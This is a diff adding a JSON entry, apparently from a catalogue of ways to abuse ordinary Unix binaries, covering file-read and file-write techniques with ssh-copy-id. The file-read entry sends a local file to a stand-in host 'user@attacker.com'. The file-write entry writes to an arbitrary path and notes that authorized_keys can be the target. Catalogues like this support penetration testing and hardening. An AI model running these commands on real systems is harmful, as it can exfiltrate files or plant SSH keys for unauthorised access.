@@ -1,0 +1,24 @@
+{
+  "functions": {
+    "file-read": [
+      {
+        "code": "ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com",
+        "comment": "The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise the `-t /path/to/output-file` option can be used.",
+        "contexts": {
+          "sudo": null,
+          "unprivileged": null
+        }
+      }
+    ],
+    "file-write": [
+      {
+        "code": "ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host",
+        "comment": "The input file must have the `.pub` file extension.",
+        "contexts": {
+          "sudo": null,
+          "unprivileged": null
+        }
+      }
+    ]
+  }
+}
